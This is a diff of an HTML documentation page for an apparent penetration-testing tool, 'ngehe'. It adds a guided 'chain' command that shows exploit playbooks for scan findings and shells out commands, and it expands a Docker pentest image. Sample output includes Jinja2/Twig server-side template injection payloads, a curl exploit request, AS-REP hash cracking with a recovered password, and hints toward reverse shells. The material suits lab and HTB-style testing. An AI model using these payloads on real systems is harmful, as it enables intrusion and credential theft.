@@ -208,7 +208,8 @@
         <li><a href="#picker">Pick a command</a></li>
         <li><a href="#container">Run as container</a></li>
         <li><a href="#prerequisites">Install on host</a></li>
-        <li><a href="#commands">The four commands</a></li>
+        <li><a href="#commands">The commands</a></li>
+        <li><a href="#chain-cmd">Guided exploit: ngehe chain</a></li>
         <li><a href="#external">External scanners</a></li>
         <li><a href="#workflow">HTB / Box workflow</a></li>
         <li><a href="#chain">From finding to box</a></li>
@@ -272,6 +273,11 @@
               <td><code>ngehe scan --openapi openapi.yaml --base https://api.example.com</code></td>
               <td>Same detectors as HAR mode, synthesized from the spec.</td>
             </tr>
+            <tr>
+              <td>A <strong>JSONL of findings</strong> (from a prior scan)</td>
+              <td><code>ngehe chain findings.jsonl</code></td>
+              <td>Guided exploit walkthrough — show each finding's playbook, prompt for command, shell it out. The bridge from "ngehe found a thing" to "I have a shell."</td>
+            </tr>
           </tbody>
         </table>
       </div>
@@ -286,13 +292,16 @@
       <h2 id="container">Run as container</h2>
       <p>If you don't want to install on your host — or you're on Apple Silicon, locked-down corporate macOS, or a server you can't pollute — use the bundled Docker image. Same image works on Linux, macOS (amd64 + arm64), Windows/WSL.</p>
 
-      <p>The image is ~1.5GB and bundles <strong>every</strong> ngehe dependency, every external scanner ngehe integrates with, and every handoff tool the per-finding playbook references:</p>
+      <p>The image is ~2GB and is built to be a <strong>self-contained pentest box</strong> — ngehe is the primary entry point, but every tool you'd reach for in a typical web or HTB engagement is on PATH:</p>
       <ul>
-        <li>ngehe + nuclei (with templates pre-baked, no first-run download) + amass + subfinder + httpx</li>
-        <li>nmap, sqlmap, hashcat, jq, dnsutils</li>
-        <li>python3-impacket (Get*NPUsers, GetUserSPNs, secretsdump, ticketer, ...)</li>
-        <li>bloodhound-python (the collector; ingest the JSON into BloodHound CE on your host)</li>
+        <li><strong>ngehe</strong> + integrations: nuclei (templates pre-baked) + amass + subfinder + httpx</li>
+        <li><strong>Web pentest:</strong> nmap, sqlmap, ffuf, gobuster, dalfox</li>
+        <li><strong>AD / box:</strong> hashcat, python3-impacket (Get*NPUsers / GetUserSPNs / secretsdump / ticketer / psexec / wmiexec / …), netexec (modern crackmapexec), evil-winrm, kerbrute, enum4linux-ng, smbclient, ldap-utils, bloodhound-python (collector)</li>
+        <li><strong>Networking / pivoting:</strong> ncat, socat, openssh-client, proxychains4</li>
+        <li><strong>Reference:</strong> PayloadsAllTheThings at <code>/opt/PayloadsAllTheThings</code> (symlinked to <code>/opt/payloads</code>)</li>
+        <li><strong>Utilities:</strong> jq, dnsutils, curl</li>
       </ul>
+      <p>Skip from the image (use Mac / your host instead): db clients (postgres/mysql/redis CLI tools — install on the host if you need them), <code>git</code>, <code>wget</code> (the host has these), the BloodHound GUI (run it on the host and ingest the JSON).</p>
 
       <h3>One-shot scans (the wrapper)</h3>
 <pre><span class="ok">$</span> ./scripts/ngehe doctor
@@ -362,7 +371,7 @@ root@container:/work# hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
         <li><strong>impacket</strong> — heavier AS-REP / Kerberoast / NTLM relay than ngehe's MVP versions.</li>
       </ul>
 
-      <h2 id="commands">The four commands</h2>
+      <h2 id="commands">The commands</h2>
       <p>Reference for each top-level command, key flags, and when to reach for it. For deep usage patterns see the <a href="#workflow">HTB workflow</a> further down.</p>
 
       <h3 style="color:var(--accent)"><code>ngehe surface</code> — map a domain's attack surface</h3>
@@ -403,6 +412,57 @@ root@container:/work# hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 <span class="cmt"># Add nuclei CVE templates as a final pass.</span>
 <span class="ok">$</span> ngehe scan --har capture.har --config ngehe.yaml --nuclei --markdown scan.md</pre>
       <p>HAR mode is the most powerful — captures real authenticated traffic from Burp / DevTools / mitmproxy, then replays every captured request through each detector. URL-only mode is good for HTB / lab boxes where you don't need session auth.</p>
+
+      <h2 id="chain-cmd">Guided exploit: <code>ngehe chain</code></h2>
+      <p>After a scan you have a JSONL of findings with per-rule playbook hints in the <code>next</code> field. <code>ngehe chain</code> walks them interactively — for each critical/high finding it displays the playbook and prompts you to type / confirm the command to run. The command is shelled out via <code>bash</code> with stdio attached, so reverse-shell listeners, <code>evil-winrm</code> sessions, interactive <code>sqlmap</code> dumps etc. all behave normally.</p>
+
+      <p><strong>This is the bridge between "ngehe found a thing" and "I have a shell."</strong> Designed to be run inside the container where every handoff tool is on PATH; on the host you'll need the tools installed yourself.</p>
+
+<pre><span class="ok">$</span> ngehe box -t 10.10.11.5 --markdown box.md --out box.jsonl
+<span class="ok">$</span> ngehe chain box.jsonl
+<span class="ok">$</span> ngehe chain box.jsonl --all     <span class="cmt"># include medium / low / info findings</span></pre>
+
+      <p>What each prompt looks like depends on whether the playbook is a single clean command or a multi-line tutorial:</p>
+
+      <div class="codecard">
+        <div class="filename">clean single-command playbook → y/n confirmation</div>
+<pre>=== Finding 2/5 ===
+  rule:     <span class="kw">kerberos-asrep-roast</span>
+  severity: HIGH
+  target:   TCP krb5://10.10.11.99:88
+  evidence: svc-helpdesk hash extracted
+
+Playbook (ngehe per-rule guidance):
+  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+
+Run [<span class="ok">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span>] ? (y/n/e=edit/s=skip/q=quit) <span class="ok">y</span>
+→ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting...
+svc-helpdesk:Welcome1!</pre>
+      </div>
+
+      <div class="codecard">
+        <div class="filename">multi-line tutorial playbook → free-text prompt</div>
+<pre>=== Finding 1/5 ===
+  rule:     <span class="kw">ssti</span>
+  severity: CRITICAL
+  target:   GET http://box.htb/api/render?msg={{1337*1331}}
+
+Playbook (ngehe per-rule guidance):
+  RCE via template. Engine identified in evidence — chain to OS commands:
+    Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+    Twig:      {{['id']|filter('system')}}
+  Get a shell then reverse-shell via netcat / Python.
+
+Type a command to run (Enter to skip / q to quit / e to edit a multi-line block):
+&gt; <span class="ok">curl 'http://box.htb/api/render' --data-urlencode "msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"</span></pre>
+      </div>
+
+      <p>Keys: <code>y</code> run / <code>n</code> skip / <code>e</code> edit-then-run / <code>s</code> skip / <code>q</code> quit. Whatever you type at the empty prompt is just shell, so pipes / redirects / <code>&amp;&amp;</code> all work. To take a break and resume later, save the JSONL and rerun <code>ngehe chain</code> against it.</p>
+
+      <div class="callout info">
+        <strong>Why no wrap-every-tool design?</strong> Every wrapper means re-exposing flags, losing version updates, and offering no value over running the tool directly. <code>ngehe chain</code> stays in the analyzer + suggester role; it brings the playbook to your fingertips but doesn't replace the tool's own CLI. You stay fluent in <code>evil-winrm</code>, <code>impacket</code>, <code>hashcat</code> as the projects intend.
+      </div>
 
       <h2 id="external">External scanners</h2>
       <p>ngehe shells out to four open-source scanners when they're on PATH. They're independent projects we integrate with — install however you like (apt, brew, our installer's <code>--with-extras</code> flag, or pre-baked in the container). Each integration writes into the same JSONL with <code>source:</code> set, so you can filter native vs upstream findings:</p>
